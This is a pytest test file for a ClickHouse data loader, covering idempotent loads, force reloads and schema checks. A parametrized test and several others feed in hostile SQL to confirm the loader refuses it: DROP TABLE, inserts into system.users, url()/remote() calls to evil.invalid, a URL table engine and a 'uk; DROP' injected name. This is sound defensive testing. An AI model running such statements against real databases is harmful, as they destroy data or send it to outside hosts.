"""LOD-01: the ClickHouse loader runs the documented load idempotently on an admin client."""

from __future__ import annotations

import shutil
from importlib import resources
from pathlib import Path

import pytest

from agentic_analytics.load import LoaderError, load_clickhouse
from agentic_analytics.load.clickhouse import load_steps, make_idempotent, rendered_sql
from agentic_analytics.packs import load_pack
from tests.load.fakes import FakeClickHouse, fixed_clock, read_fixture

ROWS = len(read_fixture())


@pytest.fixture
def pack():
    return load_pack("uk_price_paid")


@pytest.fixture
def pack_dir(tmp_path: Path) -> Path:
    src = Path(str(resources.files("agentic_analytics.packs") / "uk_price_paid"))
    dst = tmp_path / "pack"
    shutil.copytree(src, dst, ignore=shutil.ignore_patterns("__pycache__", "*.py"))
    return dst


def test_fresh_load_sends_the_documented_statements_made_idempotent(pack) -> None:
    ch = FakeClickHouse(pack)
    res = load_clickhouse(pack, ch, now=fixed_clock())
    assert res.action == "loaded" and res.engine == "clickhouse" and res.target == "uk"
    assert dict(res.rows_before) == {"uk.uk_price_paid": 0}
    assert dict(res.rows_after) == {"uk.uk_price_paid": ROWS}
    documented = [s.sql for s in load_steps(pack)]
    assert list(res.statements) == [
        documented[0].replace("CREATE DATABASE", "CREATE DATABASE IF NOT EXISTS", 1),
        documented[1].replace("CREATE TABLE", "CREATE TABLE IF NOT EXISTS", 1),
        documented[2],
    ]
    assert (
        "FROM url(" in res.statements[2]
        and "SETTINGS max_http_get_redirects=10" in (res.statements[2])
    )


def test_second_run_skips_the_insert(pack) -> None:
    ch = FakeClickHouse(pack)
    load_clickhouse(pack, ch)
    res = load_clickhouse(pack, ch)
    assert res.action == "skipped"
    assert not any(s.lstrip().upper().startswith("INSERT") for s in res.statements)
    assert dict(res.rows_after) == {"uk.uk_price_paid": ROWS}


def test_force_truncates_then_reloads(pack) -> None:
    ch = FakeClickHouse(pack)
    load_clickhouse(pack, ch)
    res = load_clickhouse(pack, ch, force=True)
    assert res.action == "reloaded"
    heads = [s.split()[0].upper() for s in res.statements]
    assert heads == ["CREATE", "CREATE", "TRUNCATE", "INSERT"]
    assert res.statements[2] == "TRUNCATE TABLE uk.uk_price_paid"
    assert dict(res.rows_before) == dict(res.rows_after) == {"uk.uk_price_paid": ROWS}


def test_force_on_an_empty_table_is_a_plain_load(pack) -> None:
    res = load_clickhouse(pack, FakeClickHouse(pack), force=True)
    assert res.action == "loaded"
    assert not any(s.startswith("TRUNCATE") for s in res.statements)


def test_documented_create_without_if_not_exists_would_fail_on_rerun(pack) -> None:
    """The fake refuses a second plain CREATE, so the idempotent rewrite is what passes."""
    ch = FakeClickHouse(pack)
    for st in load_steps(pack)[:2]:
        ch.command(st.sql)
    with pytest.raises(Exception, match="already exists"):
        ch.command(load_steps(pack)[0].sql)
    assert load_clickhouse(pack, ch).action == "loaded"


def test_make_idempotent_is_idempotent_and_touches_only_creates() -> None:
    once = make_idempotent("CREATE TABLE uk.t\n(a UInt8)")
    assert once == "CREATE TABLE IF NOT EXISTS uk.t\n(a UInt8)"
    assert make_idempotent(once) == once
    assert make_idempotent("create database uk") == "create database IF NOT EXISTS uk"
    assert make_idempotent("INSERT INTO uk.t SELECT 1") == "INSERT INTO uk.t SELECT 1"


def test_an_insert_that_adds_no_rows_stops_the_load(pack, tmp_path: Path) -> None:
    empty = tmp_path / "empty.csv"
    empty.write_text("", encoding="utf-8")
    with pytest.raises(LoaderError, match="empty"):
        load_clickhouse(pack, FakeClickHouse(pack, source=empty))


def test_a_server_error_propagates_and_nothing_after_it_is_sent(pack) -> None:
    ch = FakeClickHouse(pack, fail_on="INSERT INTO")
    with pytest.raises(Exception, match="planted failure"):
        load_clickhouse(pack, ch)
    assert not ch.statements[-1].startswith("SELECT")


def test_loader_reads_only_the_pack(pack_dir: Path) -> None:
    yaml_path = pack_dir / "pack.yaml"
    yaml_path.write_text(
        yaml_path.read_text(encoding="utf-8").replace("clickhouse: uk", "clickhouse: uk_alt"),
        encoding="utf-8",
    )
    pack = load_pack(pack_dir)
    ch = FakeClickHouse(pack)
    res = load_clickhouse(pack, ch)
    assert res.target == "uk_alt" and "uk_alt.uk_price_paid" in res.rows_after
    assert all(" uk.uk_price_paid" not in s for s in res.statements)


@pytest.mark.parametrize(
    "extra",
    [
        "DROP TABLE {database}.uk_price_paid;",
        "INSERT INTO system.users SELECT 1;",
        "CREATE TABLE other.t (a UInt8) ENGINE = Memory;",
        "SELECT * FROM url('http://evil.invalid/x', 'CSV', 'a String');",
        "INSERT INTO {database}.uk_price_paid SELECT * FROM remote('evil.invalid', default.t);",
        "INSERT INTO {database}.uk_price_paid SELECT * FROM s3('https://b.s3/x.csv', 'CSV');",
    ],
)
def test_a_pack_cannot_smuggle_other_statements(pack_dir: Path, extra: str) -> None:
    sql = pack_dir / "load" / "clickhouse.sql"
    sql.write_text(sql.read_text(encoding="utf-8") + "\n" + extra + "\n", encoding="utf-8")
    pack = load_pack(pack_dir)
    ch = FakeClickHouse(pack)
    with pytest.raises(LoaderError, match="not allowed"):
        load_clickhouse(pack, ch)
    assert ch.statements == []  # refused before anything was sent


def test_pack_database_name_is_validated(pack_dir: Path) -> None:
    yaml_path = pack_dir / "pack.yaml"
    yaml_path.write_text(
        yaml_path.read_text(encoding="utf-8").replace("clickhouse: uk", "clickhouse: 'uk; DROP'"),
        encoding="utf-8",
    )
    with pytest.raises(ValueError, match="identifier"):
        rendered_sql(load_pack(pack_dir))


def test_a_pack_cannot_swap_in_an_external_table_engine(pack_dir: Path) -> None:
    sql = pack_dir / "load" / "clickhouse.sql"
    text = sql.read_text(encoding="utf-8")
    assert text.count("ENGINE = MergeTree") == 1
    sql.write_text(
        text.replace("ENGINE = MergeTree", "ENGINE = URL('http://evil.invalid/x', 'CSV')"),
        encoding="utf-8",
    )
    pack = load_pack(pack_dir)
    ch = FakeClickHouse(pack)
    with pytest.raises(LoaderError, match="not allowed"):
        load_clickhouse(pack, ch)
    assert ch.statements == []


def _stale(pack) -> FakeClickHouse:
    ch = FakeClickHouse(pack)
    ch.command("CREATE DATABASE uk")
    ch.command(
        "CREATE TABLE uk.uk_price_paid (price UInt64, date Date) ENGINE = MergeTree ORDER BY date"
    )
    return ch


def test_an_existing_table_with_other_columns_is_refused(pack) -> None:
    ch = _stale(pack)
    with pytest.raises(LoaderError, match=r"exists with other columns .*--force"):
        load_clickhouse(pack, ch)
    assert not any(s.startswith(("DROP", "INSERT")) for s in ch.statements)


def test_force_replaces_a_table_with_other_columns(pack) -> None:
    ch = _stale(pack)
    res = load_clickhouse(pack, ch, force=True)
    assert "DROP TABLE uk.uk_price_paid" in res.statements
    assert res.action == "reloaded" and dict(res.rows_after) == {"uk.uk_price_paid": ROWS}
    assert [n for n, _ in ch.schemas["uk.uk_price_paid"]][:3] == ["price", "date", "postcode1"]
